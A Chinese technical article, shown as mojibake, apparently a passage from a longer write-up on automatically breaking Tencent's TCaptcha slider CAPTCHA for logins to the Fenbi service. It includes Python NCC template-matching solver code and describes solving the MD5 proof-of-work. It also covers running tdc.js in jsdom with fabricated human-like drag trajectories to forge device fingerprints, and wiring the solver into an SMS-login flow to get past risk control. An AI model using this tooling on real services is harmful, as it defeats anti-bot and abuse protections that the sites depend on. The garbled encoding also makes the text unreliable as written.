<p>å¨æ¹æ¡éåé¶æ®µï¼æä»¬é¢ä¸´ä¸¤ä¸ªéæ©ï¼æ·±åº¦å­¦ä¹ æ¨¡åæä¼ ç»çæ¨¡æ¿å¹éç®æ³ãæ·±åº¦å­¦ä¹ æ¨¡åçä¼å¿æ¯æ³åè½åå¼ºï¼å¯ä»¥å¤çåç§åå½¢ååªå£°ï¼ä½éè¦å¤§éæ æ³¨æ ·æ¬è¿è¡è®­ç»ï¼è¿éè¦ GPU è¿è¡æ¨çãæ´éè¦çæ¯ï¼æ·±åº¦å­¦ä¹ æ¨¡åçç²¾åº¦éå¸¸å¨ 2-5 åç´ å·¦å³ï¼è¿å¯¹äº TCaptcha è¿ç§è¦æ±ç²¾ç¡®å¹éçåºæ¯æ¥è¯´å¯è½ä¸å¤ã</p>
<p>ç¸æ¯ä¹ä¸ï¼NCCï¼å½ä¸åäºç¸å³ï¼æ¨¡æ¿å¹éç®æ³è½ç¶å¯¹å¾çååææï¼ä½å¨ TCaptcha è¿ç§å¾çè´¨éç¨³å®ãç¼ºå£å½¢ç¶è§åçåºæ¯ä¸ï¼å¯ä»¥è¾¾å°äºåç´ çº§çç²¾åº¦ãèä¸ NCC ç®æ³æ éè®­ç»ï¼åªéè¦ CPU å°±è½è¿è¡ï¼åæ¬¡æ±è§£èæ¶çº¦ 0.3 ç§ï¼éå¸¸éåæå¡ç«¯é¨ç½²ãæä»¬éæ© NCC çåå æ¯ï¼TCaptcha çå¾çè´¨éç¨³å®ï¼åºå®åè¾¨ç 672Ã390ãæ åªå£°å¹²æ°ï¼ãç¼ºå£å½¢ç¶è§åï¼æ åæ¼å¾åï¼ãNCC æ¯åç´ çº§ç²¾ç¡®å¹éèæ·±åº¦å­¦ä¹ æ¯ç¹å¾çº§è¿ä¼¼å¹éã</p>
<h4 id="ncc-ç®æ³åç">NCC ç®æ³åç</h4>
<p>NCC ç®æ³çæ ¸å¿æè·¯æ¯å¨èæ¯å¾ä¸æ»å¨æ¼å¾åï¼è®¡ç®æ¯ä¸ªä½ç½®çç¸ä¼¼åº¦ï¼æ¾å°ç¸ä¼¼åº¦æå¤§çä½ç½®ãç¸ä¼¼åº¦çè®¡ç®å¬å¼æ¯å½ä¸åäºç¸å³ç³»æ°ï¼</p>
<pre><code>NCC(x, y) = Î£[(T - TÌ) Â· (I - Äª)] / â[Î£(T - TÌ)Â² Â· Î£(I - Äª)Â²]
</code></pre>
<p>å¶ä¸­ T æ¯æ¨¡æ¿ï¼æ¼å¾åï¼çåç´ å¼ï¼I æ¯èæ¯å¾å¨ (x, y) ä½ç½®çåºååç´ å¼ï¼TÌ å Äª åå«æ¯åå¼ãNCC çå¼åæ¯ [-1, 1]ï¼è¶æ¥è¿ 1 è¡¨ç¤ºè¶ç¸ä¼¼ãè¿ä¸ªå¬å¼çæ¬è´¨æ¯è®¡ç®ä¸¤ä¸ªåéçä½å¼¦ç¸ä¼¼åº¦ï¼å½ä¸ååä¸åäº®åº¦ååçå½±åã</p>
<h4 id="å®ç°ç»èalpha-ééæ©ç ">å®ç°ç»èï¼Alpha ééæ©ç </h4>
<p>å¨å®ç°è¿ç¨ä¸­ï¼æä»¬éå°çç¬¬ä¸ä¸ªé®é¢æ¯æ¼å¾åæ¯ RGBA å¾çï¼åå«éæåºåãå¦æç´æ¥ç¨ææåç´ åä¸å¹éï¼éæåºåä¼å¹²æ°ç»æãè§£å³æ¹æ¡æ¯ä½¿ç¨ Alpha ééä½ä¸ºæ©ç ï¼åªè®©ä¸éæåºåï¼alpha &gt; 128ï¼åä¸å¹éï¼</p>
<pre><code class="language-python"># fenbi_auth/captcha/solver.py

def _ncc_match(self, bg_arr: np.ndarray, piece_rgba: np.ndarray, 
               init_y: int, pw: int, ph: int) -&gt; Tuple[int, float]:
    """ä½¿ç¨ NCC æ¨¡æ¿å¹éæ¾å°æ¼å¾åå¨èæ¯å¾ä¸­çä½ç½®ã
    
    Args:
        bg_arr: èæ¯å¾ NumPy æ°ç» (H, W, 3)
        piece_rgba: æ¼å¾å NumPy æ°ç» (ph, pw, 4)
        init_y: åå§ Y åæ ï¼prehandle ç»åºï¼
        pw, ph: æ¼å¾åå®½åº¦åé«åº¦
    
    Returns:
        (best_x, best_ncc): æä½³ X åæ åå¯¹åºç NCC ç³»æ°
    """
    # æå RGB å Alpha éé
    piece_rgb = piece_rgba[:, :, :3].astype(np.float32)
    piece_alpha = piece_rgba[:, :, 3]
    
    # åå»ºæ©ç ï¼åªå¹éä¸éæåºå
    mask = piece_alpha &gt; 128
    
    if mask.sum() &lt; 100:  # ä¸éæåç´ å¤ªå°ï¼æ æ³å¹é
        return 0, -1.0
    
    # åªæåä¸éæåºåçåç´ å¼
    piece_flat = piece_rgb[mask]
    piece_centered = piece_flat - piece_flat.mean()
    piece_norm = float(np.sqrt((piece_centered**2).sum())) + 1e-8
    
    bg_f32 = bg_arr[:, :, :3].astype(np.float32)
    
    # ä¸¤é¶æ®µæç´¢...
</code></pre>
<p>è¿ä¸ªæ©ç æºå¶éå¸¸å³é®ãæ¼å¾åçéæåºåå¨èæ¯å¾ä¸å¯¹åºçæ¯ä»»æåå®¹ï¼å¦æåä¸å¹éä¼å¼å¥å¤§éåªå£°ãéè¿ Alpha ééæ©ç ï¼æä»¬åªå¹éæ¼å¾åçå®éå½¢ç¶ï¼å¤§å¤§æé«äºå¹éç²¾åº¦ã</p>
<h4 id="æ§è½ä¼åä¸¤é¶æ®µæç´¢">æ§è½ä¼åï¼ä¸¤é¶æ®µæç´¢</h4>
<p>å¦æå¯¹èæ¯å¾çæ¯ä¸ªåç´ é½è®¡ç®ä¸æ¬¡ NCCï¼672Ã390 çå¾çéè¦è®¡ç® 262,080 æ¬¡ï¼èæ¶ä¼è¾¾å° 250 ç§ãæä»¬éç¨äºä¸¤é¶æ®µæç´¢ç­ç¥ï¼</p>
<pre><code class="language-python">    # é¶æ®µä¸ï¼ç²æï¼stride=4ï¼åªå¨ init_y è¡æ«æ
    y_min = max(0, init_y - self.y_search_range)
    y_max = min(bg_arr.shape[0] - ph, init_y + self.y_search_range)
    x_max = bg_arr.shape[1] - pw
    
    coarse_best_x = 0
    coarse_best_ncc = -2.0
    
    for x in range(0, x_max, 4):  # æ¯é 4 åç´ éæ ·ä¸æ¬¡
        region_vals = bg_f32[init_y:init_y+ph, x:x+pw][mask]
        rc = region_vals - region_vals.mean()
        rn = float(np.sqrt((rc**2).sum())) + 1e-8
        ncc = float((piece_centered * rc).sum() / (piece_norm * rn))
        
        if ncc &gt; coarse_best_ncc:
            coarse_best_ncc = ncc
            coarse_best_x = x
    
    # é¶æ®µäºï¼ç²¾æï¼å¨ç²æç»æ Â±6pxï¼y æ¹å Â±5px
    fine_x_min = max(0, coarse_best_x - 6)
    fine_x_max = min(x_max, coarse_best_x + 7)
    
    best_x = 0
    best_ncc = -2.0
    
    for y in range(y_min, y_max + 1):
        for x in range(fine_x_min, fine_x_max):
            region_vals = bg_f32[y:y+ph, x:x+pw][mask]
            rc = region_vals - region_vals.mean()
            rn = float(np.sqrt((rc**2).sum())) + 1e-8
            ncc = float((piece_centered * rc).sum() / (piece_norm * rn))
            
            if ncc &gt; best_ncc:
                best_ncc = ncc
                best_x = x
    
    return best_x, best_ncc
</code></pre>
<p>ç¬¬ä¸é¶æ®µç²æä»¥ stride=4 çæ­¥é¿å¨ init_y è¡ä¸æ«æï¼å¿«éå®ä½å¤§è´ä½ç½®ãè®¡ç®éä¸º 672/4 = 168 æ¬¡ãç¬¬äºé¶æ®µç²¾æå¨ç²æç»æç Â±6 åç´ èå´åéåç´ æç´¢ï¼åæ¶å¨ Y æ¹åä¹æç´¢ Â±5 åç´ èå´ï¼å ä¸º prehandle ç»åºç init_y å¯è½æå¾®å°åç§»ï¼ãè®¡ç®éä¸º 13Ã11 = 143 æ¬¡ãæ»è®¡ç®éä» 262,080 æ¬¡éä½å° 311 æ¬¡ï¼æ§è½æåäº 842 åï¼å®éèæ¶ä» 250 ç§éä½å° 0.3 ç§ã</p>
<h4 id="æµè¯ç»æ">æµè¯ç»æ</h4>
<p>å¨ 20 ä¸ªçå® TCaptcha æ ·æ¬ä¸æµè¯ï¼å¹³åç»å¯¹è¯¯å·®ï¼MAEï¼ä¸º 0.10 åç´ ï¼æå¤§è¯¯å·®ä¸º 0.5 åç´ ãè¿ä¸ªç²¾åº¦å·²ç»è¿è¶äººç±»æå¨æä½ï¼äººç±»è¯¯å·®éå¸¸å¨ 3-5 åç´ ï¼ï¼è¶³ä»¥éè¿ TCaptcha çæ ¡éªãè¯¯å·®ä¸»è¦æ¥æºäºç¼ºå£è¾¹ç¼çæé¯é½¿ææãJPEG åç¼©å¯¼è´çåç´ å¼å¾®å°ååï¼ä»¥åæ¼å¾åä¸ç¼ºå£çè½»å¾®å½¢ç¶å·®å¼ã</p>
<p>å®æ´çæ±è§£æµç¨å°è£å¨ SliderSolver ç±»ä¸­ï¼</p>
<pre><code class="language-python"># fenbi_auth/captcha/solver.py

class SliderSolver:
    """åºäº NCC æ¨¡æ¿å¹éçæ»åéªè¯ç æ±è§£å¨ã"""
    
    def __init__(self, *, y_search_range: int = 5):
        self.y_search_range = y_search_range
    
    def solve(self, images: CaptchaImages) -&gt; SolveResult:
        """æ±è§£æ»åéªè¯ç ï¼è¿åä½ç§»åç½®ä¿¡åº¦ã"""
        bg = np.array(Image.open(io.BytesIO(images.bg_bytes)).convert("RGB"))
        piece = images.piece_rgba
        
        piece_elem = images.layout.piece_elem
        init_x, init_y = piece_elem.init_pos
        pw, ph = piece_elem.size_2d
        
        # NCC æ¨¡æ¿å¹é
        gap_x, ncc = self._ncc_match(bg, piece, init_y, pw, ph)
        dx = gap_x - init_x  # éè¦ç§»å¨çåç´ æ°
        
        return SolveResult(
            dx=dx,
            gap_x=gap_x,
            gap_y=init_y,
            confidence=ncc,
            piece_init_x=init_x,
            piece_init_y=init_y
        )
</code></pre>
<p>ä½¿ç¨æ¶åªéåå»º SliderSolver å®ä¾ï¼è°ç¨ solve æ¹æ³å³å¯è·å¾ä½ç§» dx åç½®ä¿¡åº¦ confidenceã</p>
<h3 id="33-powproof-of-workæ±è§£">3.3 PoWï¼Proof of Workï¼æ±è§£</h3>
<p>TCaptcha è¦æ±å®¢æ·ç«¯å®æä¸ä¸ª MD5 å·¥ä½éè¯æææï¼ç¨äºé²æ­¢æ´åç ´è§£åæºå¨äººæ»å»ãprehandle ååºä¸­åå« pow_cfg å­æ®µï¼åå«ä¸ä¸ª prefix åä¸ä¸ª target_md5ãå®¢æ·ç«¯éè¦æ¾å°ä¸ä¸ª nonceï¼ä½¿å¾ <code>MD5(prefix + nonce)</code>â ç­äº target_md5ãä¾å¦ï¼å¦æ prefix æ¯ "1:3FhYxv:"ï¼target_md5 æ¯ "a1b2c3d4e5f6..."ï¼é£ä¹æä»¬éè¦æ¾å°ä¸ä¸ªæ°å­ nonceï¼ä½¿å¾ <code>MD5("1:3FhYxv:42857")</code> ç­äºç®æ åå¸å¼ã</p>
<p>å®ç°ä¸éç¨ç®åçæ´åæç´¢ï¼ä» 0 å¼å§éå¢ nonceï¼æ¯æ¬¡è®¡ç® MD5 åå¸å¹¶ä¸ç®æ å¼æ¯è¾ãä¸ºäºé¿åæ éå¾ªç¯ï¼æä»¬è®¾ç½®äºæå¤§æç´¢æ¬¡æ°ä¸º 100 ä¸æ¬¡ãå®éæµè¯ä¸­ï¼æä»¬å¯¹ 100 æ¬¡çå®è¯·æ±è¿è¡äºç»è®¡ï¼åç°å¹³å nonce å¼ä¸º 347ï¼æå¤§ nonce å¼ä¸º 1823ï¼å¹³åèæ¶ 0.8 æ¯«ç§ï¼æå¤§èæ¶ 4.2 æ¯«ç§ãè¿è¯´æ TCaptcha ç PoW é¾åº¦è®¾ç½®å¾å¾ä½ï¼nonce éå¸¸å¨å ç¾ä»¥åå°±è½æ¾å°ï¼å¯¹æ´ä½æ§è½å½±åå¯ä»¥å¿½ç¥ä¸è®¡ãè¿ä¹è¯´æ PoW ä¸»è¦æ¯è±¡å¾æ§çé²æ¤ï¼TCaptcha çæ­£çé²å¾¡éç¹å¨è®¾å¤æçº¹åè¡ä¸ºè½¨è¿¹ã</p>
<h3 id="34-tdcjs-éåè®¾å¤æçº¹ä¸è½¨è¿¹ä»¿ç">3.4 TDC.js éåï¼è®¾å¤æçº¹ä¸è½¨è¿¹ä»¿ç</h3>
<p>è¿æ¯æ´ä¸ªé¡¹ç®æå°é¾çé¨åãverify è¯·æ±ä¸­ç collect å eks å­æ®µç±è¾è®¯ç tdc.js çæï¼è¿æ¯ä¸ä¸ªç»è¿æ·±åº¦æ··æ·çå­èç èææºï¼åé¨æ è¯ä¸º <code>__TENCENT_CHAOS_VM</code>ãTDC æ¯ Tencent Device Collection çç¼©åï¼è´è´£ééä¸ç±»æ°æ®ã</p>
<p>ç¬¬ä¸ç±»æ¯è®¾å¤æçº¹ï¼åæ¬æµè§å¨ç¹å¾ï¼User-Agentãå±å¹åè¾¨çãé¢è²æ·±åº¦ãæ¶åºï¼ãCanvas æçº¹ï¼ç»å¶ç¹å®å¾å½¢åçåç´ åå¸ï¼ãWebGL æçº¹ï¼GPU æ¸²æå¨ä¿¡æ¯ï¼ãå­ä½åè¡¨ãæä»¶åè¡¨ãé³é¢ä¸ä¸ææçº¹ç­ãè¿äºä¿¡æ¯ç»åèµ·æ¥å¯ä»¥å¯ä¸æ è¯ä¸ä¸ªè®¾å¤ï¼å³ä½¿ç¨æ·æ¸é¤ Cookie ä¹æ æ³æ¹åã</p>
<p>ç¬¬äºç±»æ¯è¡ä¸ºè½¨è¿¹ï¼åæ¬æ»å¨è½¨è¿¹åæ åºåï¼x åæ éæ¶é´ååï¼ãé¼ æ ç§»å¨éåº¦åå éåº¦ãæ»å¨æ»èæ¶ç­ãè¿äºæ°æ®ç¨äºå¤æ­ç¨æ·æ¯å¦æ¯çäººæä½ï¼æºå¨äººçè½¨è¿¹éå¸¸è¿äºè§åæè¿äºéæºã</p>
<p>ç¬¬ä¸ç±»æ¯å å¯ç­¾åï¼eks å­æ®µæ¯ tdc.js ååµçå¯é¥ç­¾åï¼ç¨äºéªè¯ tdc.js çå®æ´æ§ï¼é²æ­¢å®¢æ·ç«¯ç¯¡æ¹æä¼ªé  collect æ°æ®ã</p>
<p>æä»¬å°è¯å¨ Python ä¸­æ¨¡æ tdc.js çè¾åºï¼ä½å¾å¿«åç°è¿å ä¹ä¸å¯è½ãtdc.js ä½¿ç¨èªå®ä¹å­èç èææºæ§è¡ï¼éåææ¬æé«ï¼ä¼°è®¡éè¦ 2-3 å¨æ¶é´ãèä¸ tdc.js çè·¯å¾åçæ¬å·ä¼ååï¼æ¯æ¬¡æ´æ°é½éè¦éæ°éåãtdc.js è¿ä¼æ£æµ windowãdocumentãnavigator ç­æµè§å¨å¯¹è±¡ï¼å¦æç¯å¢ä¸å¯¹ä¼æç»æ§è¡ãæå°é¾çæ¯ Canvas æçº¹ï¼éè¦çå®ç Canvas API æè½çææ­£ç¡®çæçº¹ï¼çº¯ Python æ æ³æ¨¡æã</p>
<p>æä»¬çè§£å³æ¹æ¡æ¯å¨ Node.js ç jsdom ç¯å¢ä¸­æ§è¡çå®ç tdc.jsãjsdom æ¯ä¸ä¸ªçº¯ JavaScript å®ç°ç DOM å HTML æ åï¼å¯ä»¥å¨ Node.js ä¸­æ¨¡ææµè§å¨ç¯å¢ãæä»¬çæ¶ææ¯ Python ä¸»ç¨åºéè¿ subprocess è°ç¨ Node.js æ§è¡ tdc_executor.jsï¼tdc_executor.js å¨ jsdom ä¸­å è½½å¹¶æ§è¡ tdc.jsï¼æåå° collect å eks è¿åç» Pythonã</p>
<p>å¨ tdc_executor.js ä¸­ï¼æä»¬é¦ååå»ºä¸ä¸ªèæ DOM ç¯å¢ï¼è®¾ç½® URL ä¸ºè¾è®¯éªè¯ç çååï¼User-Agent è®¾ç½®ä¸ºæ åç Chromeï¼pretendToBeVisual è®¾ç½®ä¸º true è®© jsdom æ¨¡æå¯è§åç¯å¢ï¼runScripts è®¾ç½®ä¸º "dangerously" åè®¸æ§è¡å¨ææ³¨å¥çèæ¬ãç¶åæä»¬æ¨¡ææµè§å¨ç¯å¢ï¼è®¾ç½® screen å¯¹è±¡çå®½åº¦ãé«åº¦ãé¢è²æ·±åº¦ç­å±æ§ï¼è®¾ç½® innerWidthãinnerHeightãdevicePixelRatio ç­å¨å±åéãæ¥çæä»¬åå»ºä¸ä¸ª script åç´ ï¼å° tdc.js çä»£ç æ³¨å¥å° DOM ä¸­ãç­å¾ 300 æ¯«ç§è®© tdc.js åå§åå®æåï¼æä»¬è°ç¨ TDC.setData ä¼ å¥æ»å¨è½¨è¿¹æ°æ®ï¼è°ç¨ TDC.getData è·å collectï¼è°ç¨ TDC.getInfo è·å eksã</p>
<p>ä¸ºäºè®© tdc.js çæåççè½¨è¿¹æ°æ®ï¼æä»¬å®ç°äºä¸ä¸ª ease-in-out cubic çä»¿çè½¨è¿¹çæå¨ï¼æ¨¡æäººç±»æ»å¨çå é-åé-åéè¿ç¨ãå¦æç¨æ·æ²¡ææå®æ»å¨èæ¶ï¼æä»¬éæºçæ 800-2000 æ¯«ç§ï¼è¿æ¯äººç±»æ»å¨çæ­£å¸¸èå´ãç¶åæä»¬æ ¹æ®èæ¶è®¡ç®éæ ·ç¹æ°éï¼æ¯ 30 æ¯«ç§éæ ·ä¸æ¬¡ãå¯¹äºæ¯ä¸ªéæ ·ç¹ï¼æä»¬ç¨ ease-in-out cubic ç¼å¨å½æ°è®¡ç®å½åè¿åº¦ï¼ååæ®µä½¿ç¨ <code>4 * tÂ³</code>â å®ç°å éï¼ååæ®µä½¿ç¨ <code>1 - ((-2t + 2)Â³) / 2</code> å®ç°åéãä¸ºäºæ¨¡ææé¨å¾®é¢¤ï¼æä»¬å¨ 10%-90% çæ¶é´æ®µåæ·»å  Â±1 åç´ çéæºæå¨ãæåç¡®ä¿æåä¸ä¸ªç¹ç²¾ç¡®å°è¾¾ç®æ ä½ç½®ã</p>
<p>è¿ç§æ¹æ¡çä¼å¿æ¯æ ééå tdc.jsï¼ç´æ¥æ§è¡åå§ä»£ç ï¼é¿åäºæ··æ·èææºçéåææ¬ãèä¸ tdc.js æ´æ°åæ éä¿®æ¹ä»£ç ï¼èªå¨ééæ°çæ¬ãjsdom æä¾çæµè§å¨ç¯å¢è¶³å¤çå®ï¼è½éè¿ tdc.js çæ£æµãæ½å¨é£é©æ¯ tdc.js å¯è½æ£æµ jsdom ç¹æçå±æ§ï¼å¦ navigator.webdriverï¼ï¼æèæ£æµ Canvas æçº¹çç»è®¡å­¦å¼å¸¸ãä½å®æµç»ææ¾ç¤ºï¼ç®å TCaptcha æªæ£æµ jsdom ç¯å¢ï¼éè¿ç 100%ã</p>
<h3 id="35-ç«¯å°ç«¯èªå¨åæµç¨">3.5 ç«¯å°ç«¯èªå¨åæµç¨</h3>
<p>ææç»ä»¶ç»è£å¨ automation.py ä¸­ï¼å½¢æå®æ´çéªè¯ç ç ´è§£æµæ°´çº¿ãæ´ä¸ªæµç¨ä»è°ç¨ solve_captcha å½æ°å¼å§ï¼è¿ä¸ªå½æ°æ¥å TCaptcha APP_ID åæå¤§éè¯æ¬¡æ°ä½ä¸ºåæ°ãå½æ°åé¨åå»ºä¸ä¸ª SliderSolver å®ä¾ç¨äº NCC è®¡ç®ï¼ç¶åè¿å¥éè¯å¾ªç¯ã</p>
<p>æ¯æ¬¡å¾ªç¯é¦åè°ç¨ fetch_challenge è·åéªè¯ç å¾çåéç½®ä¿¡æ¯ï¼è¿ä¸ªå½æ°åé¨ä¼è°ç¨ prehandle åå§åä¼è¯ï¼ç¶åä¸è½½èæ¯å¾ååæ¯ç²¾çµå¾ãè·åå°å¾çåï¼æä»¬è°ç¨ solver.solve è¿è¡ NCC æ¨¡æ¿å¹éï¼è®¡ç®åºæ¼å¾åéè¦ç§»å¨çåç´ æ° dxãæ ¹æ® dx åæ¼å¾åçåå§åæ ï¼æä»¬å¯ä»¥è®¡ç®åºç®æ åæ  target_x å target_yã</p>
<p>æ¥ä¸æ¥è°ç¨ solve_pow æ±è§£å·¥ä½éè¯æï¼è¿ä¸ªå½æ°ä¼æ´åæç´¢ MD5 ç¢°æï¼è¿å pow_answer åè®¡ç®èæ¶ pow_calc_timeãç¶åè°ç¨ build_ans æé ç­æ¡ JSONï¼æ ¼å¼ä¸ºåå« elem_idãtype å data çæ°ç»ã</p>
<p>æå³é®çä¸æ­¥æ¯è°ç¨ get_tdc_data çæè®¾å¤æçº¹åè½¨è¿¹æ°æ®ãè¿ä¸ªå½æ°åé¨ä¼åè°ç¨ generate_slide_trajectory çæä»¿çè½¨è¿¹ï¼ç¶åéè¿ subprocess è°ç¨ Node.js æ§è¡ tdc_executor.jsï¼å¨ jsdom ç¯å¢ä¸­è¿è¡ tdc.jsï¼æåè¿å collectãeks å tlgã</p>
<p>æåè°ç¨ submit_verify æäº¤æææ°æ®å° TCaptcha æå¡å¨ãå¦æ verify ååºç ok å­æ®µä¸º trueï¼è¯´æéªè¯éè¿ï¼æä»¬è¿ååå« ticket å randstr çæåç»æãå¦æå¤±è´¥ï¼è¿å¥ä¸ä¸æ¬¡éè¯å¾ªç¯ï¼subsid åæ°ä¼éå¢ï¼TCaptcha ä¼è¿åæ°çéªè¯ç å¾çã</p>
<p>æ´ä¸ªæµç¨çæ¶åºæ¯ï¼prehandle èæ¶çº¦ 0.5 ç§ï¼ä¸è½½å¾çèæ¶çº¦ 0.3 ç§ï¼NCC æ±è§£èæ¶çº¦ 0.3 ç§ï¼PoW æ±è§£èæ¶ä¸å° 1 æ¯«ç§ï¼çæè½¨è¿¹å TDC æ§è¡èæ¶çº¦ 0.5 ç§ï¼verify æäº¤èæ¶çº¦ 0.3 ç§ãæ»èæ¶çº¦ 5.6 ç§ï¼å¶ä¸­ç½ç»è¯·æ±å  1.1 ç§ï¼ç®æ³è®¡ç®å  0.8 ç§ï¼TDC æ§è¡å  0.5 ç§ãå¨ 5 æ¬¡å®æ¶æµè¯ä¸­ï¼éè¿çè¾¾å° 100%ï¼æ²¡æä¸æ¬¡å¤±è´¥ã</p>
<h2 id="åå·¥ç¨åå®ç°ä¸æ¶æè®¾è®¡">åãå·¥ç¨åå®ç°ä¸æ¶æè®¾è®¡</h2>
<h3 id="41-é¡¹ç®æ¶æ">4.1 é¡¹ç®æ¶æ</h3>
<p>æ´ä¸ªé¡¹ç®éç¨æ¨¡ååè®¾è®¡ï¼æ ¸å¿éªè¯ç æ¨¡åä½äº fenbi_auth/captcha ç®å½ä¸ãtcaptcha_client.py è´è´£ TCaptcha åè®®çå®ç°ï¼åæ¬ prehandle ä¼è¯åå§åãdownload_images å¾çä¸è½½ä¸è§£æãsolve_pow å·¥ä½éè¯ææ±è§£ãsubmit_verify ç­æ¡æäº¤ç­åè½ãsolver.py å®ç°äº NCC ä¸¤é¶æ®µæ¨¡æ¿å¹éæ±è§£å¨ï¼è¿æ¯æ´ä¸ªç³»ç»çæ ¸å¿ç®æ³ãtdc_executor.py æ¯ Python å° Node.js çæ¡¥æ¥å±ï¼è´è´£è°ç¨ tdc_executor.js æ§è¡ tdc.jsï¼åæ¶åå«è½¨è¿¹çæç®æ³ãautomation.py æ¯å¯¹å¤çç»ä¸å¥å£ï¼æä¾ solve_captcha å½æ°å°è£æ´ä¸ªéªè¯ç ç ´è§£æµç¨ã</p>
<p>å·¥å·å±åå« tdc_executor.jsï¼è¿æ¯ä¸ä¸ª Node.js èæ¬ï¼ä½¿ç¨ jsdom åå»ºèææµè§å¨ç¯å¢æ¥æ§è¡è¾è®¯ç tdc.jsãä¸å¡å±åå« fenbi_login.pyï¼å®ç°äºç²ç¬ç»å½æå¡ï¼åæ¬åéç­ä¿¡éªè¯ç ãæäº¤éªè¯ç å­è¯ãå¿«éç»å½ç­åè½ãå·¥å·ç±»åå« rsa_encrypt.pyï¼å®ç°äºçº¯ Python ç RSA/PKCS#1 v1.5 å å¯ï¼ç¨äºçæ info å­æ®µãhttp_client.py æä¾äºæ ä¾èµç HTTP å®¢æ·ç«¯ï¼æ¯æ cookiejar ç®¡çã</p>
<h3 id="42-è®¾è®¡åå">4.2 è®¾è®¡åå</h3>
<p>ä¼ ç»çéªè¯ç èªå¨åæ¹æ¡éå¸¸ä¾èµ Selenium æ Playwright é©±å¨çå®æµè§å¨ï¼ä½è¿ç§æ¹æ¡å­å¨ææ¾çé®é¢ãæ¯ä¸ªæµè§å¨å®ä¾å ç¨ 200-500MB åå­ï¼å·å¯å¨éè¦ 3-5 ç§ï¼èä¸ navigator.webdriver ç­ç¹å¾å®¹æè¢«æ£æµï¼åæºå¹¶åæ°éå¸¸å°äº 10ãæä»¬çæ¹æ¡æ¯çº¯ HTTP åè®®æ¨¡æï¼ä½¿ç¨ Python æ ååº urllib å®ç° HTTP å®¢æ·ç«¯ï¼å®å¨ä¸ä¾èµæµè§å¨ãåªå¨å¿è¦æ¶ï¼tdc.js æ§è¡ï¼è°ç¨ Node.js å  jsdomï¼åæ¬¡éªè¯ç æ±è§£åªé 30MB åå­ï¼æ¯æåæº 100 ä»¥ä¸çå¹¶åã</p>
<p>æ¨¡ååè®¾è®¡æ¯å¦ä¸ä¸ªéè¦ååãåè®®å±åªè´è´£ HTTP éä¿¡ï¼è°ç¨ tcaptcha_client.prehandle è¿å CaptchaLayout å¯¹è±¡ãç®æ³å±åªè´è´£å¾åå¤çï¼è°ç¨ solver.solve è¿å SolveResult å¯¹è±¡ï¼åå« dx å confidenceãæ§è¡å±åªè´è´£ tdc.js è°ç¨ï¼è°ç¨ tdc_executor.get_tdc_data è¿ååå« collect å eks çå­å¸ãç¼æå±ç»è£ææç»ä»¶ï¼è°ç¨ automation.solve_captcha è¿å CaptchaPassResult å¯¹è±¡ï¼åå« okãticket å randstrãè¿ç§è®¾è®¡ä½¿å¾æ¯ä¸ªæ¨¡åèè´£åä¸ï¼ä¾¿äºæµè¯åç»´æ¤ã</p>
<p>æ ¸å¿éªè¯ç æ¨¡ååªä¾èµ numpy ç¨äº NCC è®¡ç®ï¼Pillow ç¨äºå¾çè§£æï¼Node.js å  jsdom ç¨äº tdc.js æ§è¡ãæä»¬ä¸ä¾èµ TensorFlow æ PyTorch ç­æ·±åº¦å­¦ä¹ æ¡æ¶ï¼ä¸ä¾èµ OpenCV å¾åå¤çåºï¼ä¸ä¾èµ Selenium æ Playwright æµè§å¨èªå¨åå·¥å·ï¼ä¹ä¸ä¾èµä»»ä½ç¬¬ä¸æ¹éªè¯ç è¯å«æå¡ãè¿ä½¿å¾é¡¹ç®é¨ç½²ç®åï¼ä¾èµå°ï¼ç»´æ¤ææ¬ä½ã</p>
<h3 id="43-ä½¿ç¨ç¤ºä¾">4.3 ä½¿ç¨ç¤ºä¾</h3>
<p>å¦æåªéè¦éªè¯ç ç ´è§£åè½ï¼å¯ä»¥åç¬ä½¿ç¨éªè¯ç æ¨¡åãå¯¼å¥ solve_captcha å½æ°ï¼ä¼ å¥ TCaptcha APP_IDï¼å½æ°ä¼èªå¨å®ææ´ä¸ªéªè¯ç ç ´è§£æµç¨ï¼è¿ååå« ticket å randstr çç»æå¯¹è±¡ãå¦æ result.ok ä¸º trueï¼è¯´æéªè¯éè¿ï¼å¯ä»¥ä» result.ticket å result.randstr è·åå­è¯ãå¦æä¸º falseï¼å¯ä»¥ä» result.error è·åéè¯¯ä¿¡æ¯ã</p>
<p>å¦æéè¦éæå°ç»å½æµç¨ï¼å¯ä»¥ç»å FenbiLoginService ä½¿ç¨ãé¦ååå»º CookieHttpClient å FenbiLoginService å®ä¾ï¼ç¶åè°ç¨ send_sms_code åéç­ä¿¡éªè¯ç ãå¦æè¿åç r1.ok ä¸º false ä¸ r1.context_id å­å¨ï¼è¯´æè§¦åäºé£æ§ãæ­¤æ¶è°ç¨ solve_captcha èªå¨è¿éªè¯ç ï¼å¦æ cap.ok ä¸º trueï¼è°ç¨ captcha_check æäº¤ ticket å randstr æ¾è¡é£æ§ï¼ç¶åå¸¦ç context_id éè¯åéç­ä¿¡ãæåè¾å¥ç­ä¿¡éªè¯ç è°ç¨ quicklogin å®æç»å½ã</p>
<h2 id="äºææ¯æ»ç»ä¸åæ">äºãææ¯æ»ç»ä¸åæ</h2>
<h3 id="51-å³é®æ°æ®">5.1 å³é®æ°æ®</h3>
<p>å¨ 20 ä¸ªçå® TCaptcha æ ·æ¬ä¸æµè¯ NCC æ±è§£ç²¾åº¦ï¼å¹³åç»å¯¹è¯¯å·®ä¸º 0.10 åç´ ï¼æå¤§è¯¯å·®ä¸º 0.5 åç´ ãå¨ 5 æ¬¡å®æ¶è¯·æ±ä¸­ï¼éªè¯ç éè¿çè¾¾å° 100%ï¼æ²¡æä¸æ¬¡å¤±è´¥ãåæ¬¡æ±è§£æ»èæ¶çº¦ 5.6 ç§ï¼å¶ä¸­ NCC è®¡ç®èæ¶ 0.3 ç§ï¼PoW æ±è§£èæ¶å°äº 1 æ¯«ç§ï¼TDC æ§è¡èæ¶ 0.5 ç§ãåå­å ç¨æ¹é¢ï¼åæ¬¡éªè¯ç æ±è§£å³°å¼ä¸º 30 MBï¼è¿ä½äºæµè§å¨èªå¨åæ¹æ¡ç 200-500 MBãå¤é¨ä¾èµåªæ numpyãPillow å Node.jsï¼æ ¸å¿æ¨¡åå®å¨ä¸ä¾èµæ·±åº¦å­¦ä¹ æ¡æ¶ã</p>
<h3 id="52-ææ¯äº®ç¹">5.2 ææ¯äº®ç¹</h3>
